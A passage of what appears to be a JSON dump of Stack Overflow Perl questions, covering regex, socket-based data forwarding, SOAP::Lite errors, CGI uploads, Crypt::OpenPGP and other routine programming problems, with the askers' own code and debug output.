regex:</p>\n\n<pre><code>diff.\\*\\n.\\*\\n.\\*\\n.\\*\\n.\\*\\n\n</code></pre>\n\n<p>I want to match everything from the word \"diff\" to the fifth new line. Can someone simplify it for me?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":180,"score":3,"question_id":11937906,"title":"A simple perl program to send data from different files","body":"<p>I wrote a perl program which send the updated data from a file to remote server periodically. But now i want it to read it from differnt files and send the updated data such that the reciever should know how to seperate the data from the mixed data. Do i just need to put some kind of delimiter? Is there any standards already there for such things?</p>\n\n<pre><code>#############\n#Change parameters\n############\n$PeerAddr='192.168.0.7';\n$PeerPort='7070';\n##############\n# Import packages\n##############\nuse Text::Diff;\nuse IO::Socket;\n#############\n# Define global variables\n#############\n$lineCount=0;\n$loopCount=0;\nour $stats2 = 0;\nfor($count = 0; $count &lt;= 10000; $count++){\n        my $data_dir=\"archive/otat/*dat\";\n        my $data_file= `ls -t $data_dir | head -1`;\n        chomp($changed_data_file);\n        print \"old data_file is $changed_data_file \\n\";\n        chomp($data_file);\n        if($data_file ne $changed_data_file){\n                $lineCount2=0;\n                $changed_data_file=$data_file;\n                print (\"String:$data_file :$changed_data_file  are not equal\\n\");\n                }\n        while(defined($data_file)){\n                print \"$data_file \\n\";\n                open (DAT,$data_file) || die(\"Could not open file! $!\");\n                @iofile = &lt;DAT&gt;;\n                $lineCount = @iofile;\n                splice(@diffLines);\n                print \"printing: $lineCount\\n\";\n                print \"printing 2: $lineCount2 \\n\";\n                chomp $lineCount;\n                chomp $lineCount2;\n                if($lineCount != $lineCount2){\n                        $j=0;\n                        for($i=$lineCount2;$i &lt;= $lineCount; $i++){\n                        $diffLines[$j] = $iofile[$i];\n                                $j++;\n                }\n                        $num=@diffLines;\n                        print \"count of diff lines:$num\\n\";\n                        $lineCount2 = $lineCount;\n                        $loopCount=0;\n                }\n                if($loopCount&gt;2){\n                        $loopCount=0;\n                        print \"Look for recent file \\n\";\n                        last;\n                }\n                $loopCount++;\n                sleep(5);\n############################\n                &amp;socket_con(@diffLines);\n        }\n\n}\n#### Methods/Functions\nsub socket_con {\n        if ($sock== 0){\n                $sock = new IO::Socket::INET (\n                                                        PeerAddr =&gt; $PeerAddr,\n                                                        PeerPort =&gt; $PeerPort,\n                                                        Proto =&gt; 'tcp'\n                                                        );\n                die \"Could not create socket: $!\\n\" unless $sock;\n        }\n        print $sock @_;\n#close($sock);\n}\n</code></pre>\n"},{"tags":["regex","perl","perl-module"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12554052,"title":"Creating an optimized pattern using Text::Balanced to format with Text::Markdown","body":"<p>I can run the following on a csv file in order to get the delimited text from the file.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse Text::Balanced q/extract_delimited/;\n\nmy $filecontents = do { local $/; &lt;&gt; };\n\nwhile (my $item = extract_delimited($filecontents, '\"')) {\n    print \"Item: $item\\n\";\n}\n</code></pre>\n\n<p>but the results always include the quotes which is what I do not want so I tried the following to completely isolate the multi line record</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse Text::Balanced qw/gen_delimited_pat/;\n\nmy $filecontents = do { local $/; &lt;&gt; };\n$patstring = gen_delimited_patq(\\G(?:[^\"]|\"\"|\"\"\")* ]))\n\nwhile (my $item = extract_delimited($filecontents, '\"')) {\n    print \"Item: $item\\n\";\n}\n</code></pre>\n\n<p>since I know this regex </p>\n\n<pre><code>\\G(?:[^\"]|\"\"|\"\"\")*\n</code></pre>\n\n<p>finds the complete multi line record that I would like to then process with Text::Markdown however I get errors that </p>\n\n<ul>\n<li>Use of ?PATTERN? without explicit operator is deprecated at line 10.</li>\n<li>Global symbol \"$patstring\" requires explicit package name at line 10.</li>\n<li>Search pattern not terminated at line 10.</li>\n</ul>\n\n<p>I am trying to only get the delimited text for record that looks something like this excluding the beginning and ending quote I hope this makes sense:</p>\n\n<p>\"description\"\n\"Star-Lite 2-Person w/Fly Aluminum, Rust</p>\n\n<p>Specifications:</p>\n\n<ul>\n<li>Packed size: 13\"\" X 5\"\" </li>\n<li>1 Door </li>\n<li>Interior Area: 41.25 sq. ft. </li>\n<li>Peak Height: 44\"\" </li>\n<li>Floor Material: 190T polyester, 2000mm P.U. coated </li>\n<li>Mesh: No-see-um </li>\n<li>Number of poles: 2 shock corded aluminum 8.5 mm. </li>\n<li>Pole sections: 12\"\" lengths. </li>\n<li>Rainfly Included. </li>\n<li>90\"\" X 66\"\" X 44\"\"\"</li>\n</ul>\n\n<p>Excluding the first row I only want </p>\n\n<p>Star-Lite 2-Person w/Fly Aluminum, Rust</p>\n\n<p>Specifications:</p>\n\n<ul>\n<li>Packed size: 13\"\" X 5\"\" </li>\n<li>1 Door </li>\n<li>Interior Area: 41.25 sq. ft. </li>\n<li>Peak Height: 44\"\" </li>\n<li>Floor Material: 190T polyester, 2000mm P.U. coated </li>\n<li>Mesh: No-see-um </li>\n<li>Number of poles: 2 shock corded aluminum 8.5 mm. </li>\n<li>Pole sections: 12\"\" lengths. </li>\n<li>Rainfly Included. </li>\n<li>90\"\" X 66\"\" X 44\"\"</li>\n</ul>\n\n<p>What do I need to do to fix my pattern for this module?</p>\n\n<p>EDIT: Pasted the wrong script that worked</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":670,"score":1,"question_id":2964484,"title":"Perl - How to print all CP1252 characters on by one?","body":"<p>I am not able to write a script to print all the Latin-1 characters one by one. How can I do it?</p>\n\n<p>I am using the below code, but it is not giving me expected result.</p>\n\n<pre><code>foreach $char(0..255)  {\n    $hexval   = sprintf(\"%x\",$char);\n    $charval = sprintf(\"%c\",%hexval);\n    print \"$charval\";\n}\n</code></pre>\n\n<p>Output should be like:</p>\n\n<pre><code>0065 - e\n0066 - f\n...\n...\n007F - character at the step\n</code></pre>\n\n<p>For all the codepoints after <code>007F</code>, it is not giving me the expected results.</p>\n"},{"tags":["python","perl","language-agnostic"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12553197,"title":"Messed up records - separator inside field content","body":"<p>I am provided with text files containing data that I need to load into a postgres database.</p>\n\n<p>The files are structured in records (one per line) with fields separated by a tilde (~). Unfortunately it happens that every now and then a field content will include a tilde.</p>\n\n<p>As the files are not tidy CSV, and the tilde's not escaped, this results in records containing too many fields, which cause the database to throw an exception and stop loading.</p>\n\n<p>I know what the record should look like (text, integer, float fields).</p>\n\n<p>Does anyone have suggestions on how to fix the overlong records? I code in per but I am happy with suggestions in python, javascript, plain english. </p>\n"},{"tags":["perl","encryption","md5","rsa","checksum"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":99,"score":0,"question_id":12553020,"title":"MD5 Checksum with optional 128/256/512/1024/2048-bit size in Perl","body":"<p>Is it possible to use <strong>MD5</strong> to get checksum that would have optional size of 128/256/512/1024/2048-bit?</p>\n\n<p>The <code>Digest::MD5</code> module allows to use the RSA MD5 Message Digest algorithm that takes as input a message of arbitrary length and produces as output a <strong>128-bit fingerprint</strong>.</p>\n\n<p>How can be used MD5 to produce <strong>larger</strong> fingerprint?</p>\n"},{"tags":["linux","perl"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":89,"score":1,"question_id":11487503,"title":"Reading specified line using Perl program and command-line arguments","body":"<p>So, let's say I am writing a Perl program: </p>\n\n<pre><code>./program.perl 10000 &lt; file\n</code></pre>\n\n<p>I want it to read the 10000th line of \"file\" only. How could I do it using input redirection in this form? It seems that I keep getting something along the lines of 10000 is not a file.</p>\n\n<p>I thought this would work: </p>\n\n<pre><code>#!/usr/bin/perl -w\n$line_num = 0;\nwhile ( defined ($line = &lt;&gt;) &amp;&amp; $line_num &lt; $ARGV[0]) {\n    ++$line_no;\n    if ($line_no == $ARGV[0]) {\n        print \"$line\\n\";\n        exit 0;\n    }\n}\n</code></pre>\n\n<p>But it failed miserably.</p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12547861,"title":"Regular expression is is looping the expression and returning it as one result","body":"<p>I am writing a perl script to generate .cpp files out of .h files using regular expressions to find functions, then using regex again to break the reults into two peices, the return type and the function.</p>\n\n<p>I created a regular expression to find the return type which almost works.</p>\n\n<pre><code>^(\\s*&amp;?\\w*\\s*(\\&lt;{1}.*\\&gt;{1})*\\s)\n</code></pre>\n\n<p>Edit: I updated the regex string to one that works better, but still no change as far as this question is concerned.</p>\n\n<p>This works on most cpp prototypes such as</p>\n\n<pre><code>int funky();\nint funky(int something);\n&amp;int funky(int something);\n&amp;int &lt;vector *&gt; funky();\n</code></pre>\n\n<p>in these cases the regex matches</p>\n\n<pre><code>int\nint\n&amp;int\n&amp;int &lt;vector *&gt;\n</code></pre>\n\n<p>Which is perfect, however in cases where there is a string that matches inside the function arguments, such as:</p>\n\n<pre><code>int &lt;vector&gt; funky(int &lt;vector&gt; i);\nint &lt;vector&gt; funky(int &lt;vector *&gt; i);\nint &lt;vector&gt; funky(const int &lt;vector&gt; i);\n</code></pre>\n\n<p>The regex matches </p>\n\n<pre><code>int &lt;vector&gt; funky(int &lt;vector&gt;\nint &lt;vector&gt; funky(int &lt;vector *&gt;\nint &lt;vector&gt; funky(const int &lt;vector&gt;\n</code></pre>\n\n<p>When I want it to return </p>\n\n<pre><code>int &lt;vector&gt;\nint &lt;vector&gt;\nint &lt;vector&gt;\n</code></pre>\n\n<p>And I can't figure out whey its continuing past the end of the first closing bracket '>'. I am new to regular expressions and simply can't figure this out. </p>\n\n<p>Sorry of there is an answer out there for this, I searched and haven't been able to find one, probably cause i don't even know what terms to look for :(.</p>\n\n<p>Edit2: If this question is more complicated than I anticipated, could someone explain why it continues on past the first &lt;.*>? I don't see why this doesn't work.</p>\n"},{"tags":["web-services","perl","soap","soaplite"],"answer_count":4,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":1164,"score":8,"question_id":10752009,"title":"Perl/Soap lite : \"Server was unable to process request. Object reference not set to an instance of an object\"","body":"<p>I'm trying to consume a Webservice already existing and that works perfectly. After having read many tutorials and examples, I finally managed to get an answer from the server:</p>\n\n<blockquote>\n  <p>Server was unable to process request. Object reference not set to an instance of an object</p>\n</blockquote>\n\n<p>The WS simply allows you to get and ID from an NT login (one string param, one string answer).</p>\n\n<p>Here is my perl script:</p>\n\n<pre><code>#!perl -w\nuse strict;\nuse warnings;\n\nuse LWP::UserAgent; \nuse SOAP::Lite on_action =&gt; sub { \"$_[0]$_[1]\"; };\nuse LWP::Debug; LWP::Debug::level('+'); SOAP::Lite-&gt;import(+trace =&gt; 'all');\n#use SOAP::Lite  +trace =&gt;  'debug';\n#sub SOAP::Transport::HTTP::Client::get_basic_credentials { return ('user' =&gt; 'pwd') };\nuse Data::Dumper;\n\nmy $var = SOAP::Data-&gt;new(name =&gt; 'NTLogin', value =&gt; \"1234\", type =&gt;'s:string');\n\nmy $resultLogin = SOAP::Lite\n  -&gt; uri('http://xxxxx')\n  -&gt; proxy('http://yyyyy/zzzzz/directory.asmx')\n  -&gt; on_action( sub { join '/', @_ } )\n  -&gt; GetUIDFromNTLogin($var);\n\nprint \"lets test it...\\n\\n\";\n\n  print $resultLogin;\n  print \"\\nresult():\\n\";\n  print $resultLogin-&gt;result();\n</code></pre>\n\n<p>And here's the output:</p>\n\n<pre><code>Launching NT to UID conversion\nSOAP::Data::new: ()\nSOAP::Lite::new: ()\nLWP::UserAgent::new: ()\nSOAP::Transport::HTTP::Client::new: ()\nSOAP::Lite::call: ()\nSOAP::Serializer::envelope: ()\nSOAP::Serializer::envelope: GetUIDFromNTLogin SOAP::Data=HASH(0x______)\nSOAP::Data::new: ()\nSOAP::Data::new: ()\nSOAP::Data::new: ()\nSOAP::Data::new: ()\nSOAP::Data::new: ()\nSOAP::Transport::HTTP::Client::send_receive: HTTP::Request=HASH(0x______)\nSOAP::Transport::HTTP::Client::send_receive: POST http://yyyyy/zzzzz/directory.asmx\nAccept: text/xml\nAccept: multipart/*\nContent-Length: 534\nContent-Type: text/xml; charset=utf-8\nSOAPAction: http://tempuri.org/GetUIDFromNTLogin\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;SOAP-ENV:Envelope xmlns:xsi=\"http://www.w\n3.org/1999/XMLSchema-instance\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/e\nncoding/\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"\nhttp://www.w3.org/1999/XMLSchema\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap\n.org/soap/encoding/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;namesp1:GetUIDFromNTLogin xmlns:namesp1=\"ht\ntp://tempuri.org\"&gt;&lt;NTLogin xsi:type=\"s:string\"&gt;1234&lt;/NTLogin&gt;&lt;/namesp1:\nGetUIDFromNTLogin&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\nLWP::UserAgent::request: ()\nLWP::UserAgent::send_request: POST http://yyyyy/zzzzz/directory.asmx\nLWP::UserAgent::_need_proxy: Not proxied\nLWP::Protocol::http::request: ()\nLWP::Protocol::collect: read 441 bytes\nLWP::UserAgent::request: Simple response: Internal Server Error\nSOAP::Transport::HTTP::Client::send_receive: HTTP::Response=HASH(0x______)\nSOAP::Transport::HTTP::Client::send_receive: HTTP/1.1 500 Internal Server Error\nCache-Control: private\nDate: Mon, 04 Jun 2012 15:54:47 GMT\nServer: Microsoft-IIS/6.0\nContent-Length: 441\nContent-Type: text/xml; charset=utf-8\nClient-Date: Mon, 04 Jun 2012 15:54:47 GMT\nClient-Peer: 10.94.61.146:80\nClient-Response-Num: 1\nSet-Cookie: BIGipServer_____________-http=_________________; path=/\nX-AspNet-Version: 2.0.50727\nX-Powered-By: ASP.NET\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;soap:Envelope xmlns:soap=\"http://schemas.\nxmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\n\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;&lt;soap:Body&gt;&lt;soap:Fault&gt;&lt;faultcode\n&gt;soap:Server&lt;/faultcode&gt;&lt;faultstring&gt;Server was unable to process request. ---&amp;g\nt; Object reference not set to an instance of an object.&lt;/faultstring&gt;&lt;detail /&gt;\n&lt;/soap:Fault&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;\nSOAP::Deserializer::deserialize: ()\nSOAP::Parser::decode: ()\nSOAP::SOM::new: ()\nSOAP::Lite::DESTROY: ()\nSOAP::Deserializer::DESTROY: ()\nSOAP::Transport::DESTROY: ()\nSOAP::Transport::HTTP::Client::DESTROY: ()\nSOAP::Serializer::DESTROY: ()\nSOAP::Data::DESTROY: ()\nSOAP::Data::DESTROY: ()\nSOAP::Data::DESTROY: ()\nSOAP::Data::DESTROY: ()\nSOAP::Data::DESTROY: ()\nlets test it...\n\n1\nresult():\nSOAP::SOM::DESTROY: ()\nSOAP::Data::DESTROY: ()\nSOAP::Parser::DESTROY: ()\nSOAP::Transport::DESTROY: ()\nSOAP::Serializer::DESTROY: ()\nSOAP::Deserializer::DESTROY: ()\nSOAP::Lite::DESTROY: ()\nPress any key to continue . . .\n</code></pre>\n\n<p>After some research I've done, I've got the impression that the error is on the WS server's side. Yet the WS seems to work perfectly, so I guess something is wrong with my Perl script but I cannot figure out what...</p>\n\n<p>Any help would be very much appreciated !</p>\n\n<p>Thanks,</p>\n\n<p><strong><em>[Update #1]</em></strong></p>\n\n<p>Here's the example given by the WS page:</p>\n\n<p><strong>Request</strong></p>\n\n<pre><code>POST /zzzzz/directory.asmx HTTP/1.1\nHost: yyyyy\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://xxxxx/GetUIDFromNTLogin\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;\n  &lt;soap:Body&gt;\n    &lt;GetUIDFromNTLogin xmlns=\"http://xxxxx/\"&gt;\n      &lt;NTLogin&gt;string&lt;/NTLogin&gt;\n    &lt;/GetUIDFromNTLogin&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre>\n\n<p><strong>Response</strong></p>\n\n<pre><code>HTTP/1.1 200 OK\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;\n  &lt;soap:Body&gt;\n    &lt;GetUIDFromNTLoginResponse xmlns=\"http://xxxxx/\"&gt;\n      &lt;GetUIDFromNTLoginResult&gt;string&lt;/GetUIDFromNTLoginResult&gt;\n    &lt;/GetUIDFromNTLoginResponse&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre>\n\n<p><strong><em>[Update #2]</em></strong></p>\n\n<p>Here's the output to what user1215106 suggested:</p>\n\n<pre><code>&lt;HTML&gt;\n&lt;HEAD&gt;&lt;TITLE&gt;An Error Occurred&lt;/TITLE&gt;&lt;/HEAD&gt;\n&lt;BODY&gt;\n&lt;H1&gt;An Error Occurred&lt;/H1&gt;\n400 Bad Request\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n</code></pre>\n"},{"tags":["perl","getopt-long"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":384,"score":1,"question_id":6254152,"title":"Can I call Getopts multiple times in perl?","body":"<p>I am a noob to perl, so please try to be patient with this question of mine.</p>\n\n<p>It seems that if I make multiple calls to perl Getopts::Long::GetOpts method, the second call is completely ignored.</p>\n\n<ol>\n<li><p>Is this normal??(Why)</p></li>\n<li><p>What are the alternatives to this process??</p></li>\n</ol>\n\n<p>(Actually Ive written a module, where I make a GetOpts call, an the script using my module tries to do that too, but it seems that script does not get the required options)</p>\n\n<p>Thanks,\nNeeraj</p>\n"},{"tags":["perl","hash","push"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12535534,"title":"Pushing a hash to an existing hash in Perl","body":"<p>I'm new to Perl, so you'll have to forgive my code.</p>\n\n<p>I'm reading a file that tree structured (like xml, just not actually) and I want to <code>foreach</code> through the tree and if a certain \"node\" doesn't have a child node, I want to insert it. Simple enough.</p>\n\n<p>Here's my code:</p>\n\n<pre><code>foreach $key ( @{$struct-&gt;{'transferBatch'}-&gt;{'callEventDetails'} } ) {\n\n    foreach ( keys %{$key} ) {\n\n        if ( $_ eq \"mobileTerminatedCall\" ) {\n\n            if ( defined $key-&gt;{$_}-&gt;{'basicServiceUsedList'} ) {\n\n                if ( defined $key-&gt;{$_}-&gt;{'basicServiceUsedList'}[0]-&gt;{'chargeInformationList'} ) {\n\n                    if ( not defined $key-&gt;{$_}-&gt;{'basicServiceUsedList'}[0]-&gt;{'chargeInformationList'}[0]-&gt;{'CallTypeGroup'} ) {\n\n                        $CallTypeGroup = {                          \n                                \"CallTypeLevel1:\" =&gt; \"0\",\n                            \"CallTypeLevel2:\" =&gt; \"0\",\n                            \"CallTypeLevel3:\" =&gt; \"0\"\n\n                        };                          \n\n                        #Doesn't work! \n                        $key-&gt;{$_}-&gt;{'basicServiceUsedList'}[0]-&gt;{'chargeInformationList'}[0]{'CallTypeGroup'} =  $CallTypeGroup;\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>The iteration is working fine, but my <code>push</code> call fails saying it's not an ARRAY reference. I feel like I'm close, but I need that line to insert the <code>$CallTypeGroup</code> hash as a child to the current spot.</p>\n\n<p>Any help is appreciated!</p>\n"},{"tags":["perl","apache2","mod-perl2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12528414,"title":"Why Apache PerlModule directive doesn't set custom environment variables?","body":"<p>I am building a mod_perl website, and I need to set an environment variable that will be used in the Perl code.</p>\n\n<p>Until now I was using the <code>PerlSetEnv</code> directive to set this variable:</p>\n\n<pre><code>    PerlSetEnv MYVAR myvalue\n\n    &lt;LocationMatch /perlpath/&gt;\n        SetHandler modperl\n        PerlResponseHandler myhandler\n        Header set Cache-control \"no-cache\"\n    &lt;/LocationMatch&gt;\n</code></pre>\n\n<p>This works fine, but I'd like to preload my mod_perl handler, because the first call is very slow. So I changed my Apache virtualhost file to:</p>\n\n<pre><code>    PerlSetEnv MYVAR myvalue\n    PerlModule myhandler         &lt;- add this line\n\n    &lt;LocationMatch /perlpath/&gt;\n        SetHandler modperl\n        PerlResponseHandler myhandler\n        Header set Cache-control \"no-cache\"\n    &lt;/LocationMatch&gt;\n</code></pre>\n\n<p>But if I do this, my custom environment variable <code>MYVAR</code> is not set when preloading <code>myhandler</code>, and my code fails.</p>\n\n<p>So is it possible to set an environment variable that will be exported by the <code>PerlModule</code> directive?</p>\n"},{"tags":["forms","perl","pdf","script","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12546066,"title":"Show an server answer in a PDF form","body":"<p>I have a PDF form that submits the information to an Apache server with a CGI script written in Perl:</p>\n\n<pre><code>var doc = event.target;\n\nvar x = doc.submitForm({\n        cURL: \"http:\",\n        cSubmitAs: \"XML\" \n        }); \n</code></pre>\n\n<p>The CGI is capable of reading the information and saving it in a file, but I want to resubmit a reference code to the <code>x</code> variable in the PDF and then have the PDF show it in a box. I use this in the CGI script:</p>\n\n<pre><code>print \"Content-type: text/html\\n\\n\";\nprint \"$i\";\n</code></pre>\n\n<p>but itâs opening a new PDF that shows the content of the variable <code>$i</code>.</p>\n\n<p>I donât know if the problem is the PDF code that specifies in another way the reading of the variable or if it is the CGI script that sends the value in a wrong way.  Can you explain?</p>\n"},{"tags":["perl","post","file-upload","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":174,"score":1,"question_id":9287175,"title":"Tricky Issue Handling File Upload in Perl","body":"<p>We use CGI.pm to help us handle file uploading on our website and through our API which is used by our Android &amp; iPhone Apps. We recently noticed that CGI.pm seems to be returning no params for almost 50% of the files being uploaded via our iPhone App. We haven't seen a similar issue with those files being uploaded via our website.</p>\n\n<p>We can't replicate the problem in testing but in production the cgi_error() method of CGI.pm isn't reporting any errors in those cases where the CGI.pm params are missing. We have confirmed that the iPhone App is always including the correct params when POSTing the files for upload.</p>\n\n<p>Quick background on the setup. We have the application delpoyed on Amazon EC2 Servers which are being load balanced using the Amazon Elastic Load Balancers. We also have $CGI::POST_MAX=(1024*100000); so the POST max size is set to 100MB and we have confirmed that all uploads are under this limit.</p>\n\n<p>I'm not sure where to go next. Any ideas on what the issue might be and how to resolve it would be great appreciated. Also helpful would be any ideas on how to identify the root of the issue so we can start troubleshooting.</p>\n\n<p>Thanks in advance for your help!</p>\n"},{"tags":["perl","arrays","hash","mapping"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":588,"score":4,"question_id":2957879,"title":"Perl map - need to map an array into a hash as arrayelement->array_index","body":"<p>I have a array like this:</p>\n\n<pre><code>my @arr = (\"Field3\",\"Field1\",\"Field2\",\"Field5\",\"Field4\");\n</code></pre>\n\n<p>Now i use map like below , where <strong>/DOSOMETHING/</strong> is the answer am seeking.</p>\n\n<pre><code>my %hash = map {$_ =&gt; **/DOSOMETHING/** } @arr\n</code></pre>\n\n<p>Now I require the hash to look like below:</p>\n\n<pre>\nField3 => 0\nField1 => 1\nField2 => 2\nField5 => 3\nField4 => 4\n</pre>\n\n<p>Any help?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":76,"score":-1,"question_id":12549480,"title":"Coding of '\\xa1' in Perl","body":"<p>I want to process a txt file using perl. I have succeeded in using this perl code to process wikipedia txt file before, so it is correct. But when I run the perl code, there appears an error:</p>\n\n<pre><code>utf8 \"\\xA1\" does not map to Unicode at xxx\n</code></pre>\n\n<p>I check the txt file. There is \\xA1 characters in it. I tried to remove those \"\\xA1\" with RegEx <code>s/(\\xa1)+//g;</code> but failed.</p>\n\n<p>So what is the problem and how can I solve this?</p>\n"},{"tags":["perl","pgp"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":12540226,"title":"Crypt::OpenPGP Symkey decrypt failed: Invalid secret key ID","body":"<p>I am having a problem where <a href=\"https://metacpan.org/module/Crypt%3a%3aOpenPGP\" rel=\"nofollow\">Crypt::OpenPGP</a> is unable to decrypt a message encoded by GPG. It seems that I am <a href=\"http://www.perlmonks.org/?node_id=958887\" rel=\"nofollow\">not the first</a> to have this problem. But no solution was found on that thread.</p>\n\n<pre><code>my $pgp = load_class('Crypt::OpenPGP')-&gt;new;\n$pgp-&gt;handle(\n     Data =&gt; $encrypted,\n) or confess $pgp-&gt;errstr;\n</code></pre>\n\n<p>Crypt::OpenPGP prompts correctly for the key passphrase, finding the key successfully, and I'v tested to make sure the passphrase works with GPG. But when attempting to decrypt the message with Crypt::OpenPGP I get the error.</p>\n\n<p><code>Symkey decrypt failed: Invalid secret key ID</code></p>\n\n<p>according to the thread the following have been tested</p>\n\n<ol>\n<li>Encrypt with gpg and decrypt with gpg.\n<ul>\n<li>Works fine, as expected</li>\n</ul></li>\n<li>Encrypt with perl using Crypt::OpenPGP and decrypt with gpg.\n<ul>\n<li>Works fine.</li>\n</ul></li>\n<li>Encrypt with perl using Crypt::OpenPGP and decrypt with perl using Crypt::OpenPGP\n<ul>\n<li>Works fine.</li>\n</ul></li>\n<li>Encrypt with gpg and decrypt with perl using Crypt::OpenPGP\n<ul>\n<li>Failure with \"Symkey decrypt failed: Invalid secret key ID\" message. This is the situation described above</li>\n</ul></li>\n</ol>\n\n<p>which seems to reflect my own observation though I've not tested a few of these. Does anyone know the cause or even better a fix?</p>\n"},{"tags":["perl","unit-testing","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":36,"score":2,"question_id":12523453,"title":"Test::Base::Filter arguments","body":"<p>In the <a href=\"http://search.cpan.org/perldoc?Test%3a%3aBase#Rolling_Your_Own_Filters\" rel=\"nofollow\">POD for Test::Base</a>, there is an example on rolling my own filters, which the documentation says is \"self explanatory\". I am having trouble understanding it and I think it may be a problem in my filter writing. The code is reproduced below:</p>\n\n<pre><code>use Test::Base;\n\nfilters 'foo', 'bar=xyz';\n\nsub foo {\n    transform(shift);\n}\n\nsub Test::Base::Filter::bar {\n    my $self = shift;       # The Test::Base::Filter object\n    my $data = shift;\n    my $args = $self-&gt;current_arguments;\n    my $current_block_object = $self-&gt;block;\n    # transform $data in a barish manner\n    return $data;\n}\n</code></pre>\n\n<p>The <code>filters</code> function sets the named subroutines as filters on the incoming data. The declared filters are 'foo' and 'bar', which has arguments. </p>\n\n<p>My question is why the structure of foo and bar are so different. Why is foo in the current namespace while bar is declared in the Test::Base::Filter namespace? And why does foo alter its first argument, while bar must grab the data from the second argument?</p>\n\n<p>Another example. In MyTest.pm:</p>\n\n<pre><code>package t::MyTest;\nuse Test::Base -Base;\n#some stuff here\n\npackage t::MyTest::Filter;\nuse base 'Test::Base::Filter';\n\nsub choose {\n    print @_;\n    return {foo =&gt; 'bar'} if($_[0] eq '1');\n    return undef;\n}\nsub is_defined{ \n    print @_;\n    defined $_[0];\n}\n</code></pre>\n\n<p>And in test.t:</p>\n\n<pre><code>use t::MyTest;\n\nfilters {input =&gt; [qw(choose is_defined)] };\n__END__\n=== First\n--- input\n1\n--- expected: 1\n=== Second\n--- input\n0\n--- expected: 0\n</code></pre>\n\n<p>If you place both of those in a \"t\" folder and run <code>prove -v</code>, this is the output:</p>\n\n<pre><code>t\\01-test.t .. Use of uninitialized value $_[1] in print at t/MyTest.pm line 14,\n &lt;DATA&gt; line 1.\n\n1\nt::MyTest::Filter=HASH(0x2af1670)ok 1 - First\n1..1\nFailed 1/1 subtests\n\nTest Summary Report\n-------------------\nt\\01-test.t (Wstat: 0 Tests: 0 Failed: 0)\n  Parse errors: Bad plan.  You planned 1 tests but ran 0.\nFiles=1, Tests=0,  1 wallclock secs ( 0.06 usr +  0.23 sys =  0.30 CPU)\nResult: FAIL\n</code></pre>\n\n<p>Nevermind the warning (which I don't completely understand the root of). Why is the first filter passed the input (like it's supposed to be), but the second one is passed some Filter object? Shouldn't the input of the second filter be the output of the first? If it isn't, then I have to worry about filter ordering all over the place.</p>\n"},{"tags":["perl","filesystems","directory","mkdir"],"answer_count":4,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":4865,"score":5,"question_id":1050365,"title":"How do I create a directory and parent directories in one Perl command?","body":"<p>In Perl, how can I create a subdirectory and, at the same time, create parent directories if they do not exist?  Like UNIX's mkdir -p command?</p>\n"},{"tags":["perl","deployment","module","bundle"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12546801,"title":"Bundling perl prereq module in source form for deployment?","body":"<p>My webapp depends on quite a few modules. When I deploy 